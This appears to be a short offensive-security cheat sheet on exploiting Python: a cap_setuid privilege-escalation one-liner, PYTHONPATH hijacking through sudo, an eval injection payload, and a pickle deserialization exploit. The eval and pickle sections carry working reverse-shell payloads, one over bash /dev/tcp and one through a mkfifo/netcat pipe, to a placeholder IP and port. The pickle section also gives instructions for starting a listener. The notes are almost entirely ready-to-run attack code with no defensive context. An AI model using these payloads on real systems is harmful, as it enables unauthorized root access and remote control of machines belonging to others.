# python2 python3

* [https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1](https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1)
* [https://medium.com/@abdelazimmohmmed/python-input-vulnerability-30b0bfea22c9](https://medium.com/@abdelazimmohmmed/python-input-vulnerability-30b0bfea22c9)

## Capability: cap_setuid

```
nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.system("whoami;id;uname -a")'
```

## Capability: SETENV (allows to set env_var)

```
# admin_tasks uses a py module
# create it and specify path to run code
sudo PYTHONPATH=/tmp/py/ /opt/scripts/admin_tasks.sh
```

## eval

```python
__import__('os').system('bash -i >& /dev/tcp/IP/PORT 0>&1')#
```

## Pickle Serializing and de-serializing Python object structures,

```python
- Start listener using nc -lvnp 4444
- Run this on target system to get back shell

import pickle
import sys
import base64

command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat IP PORT > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))
```
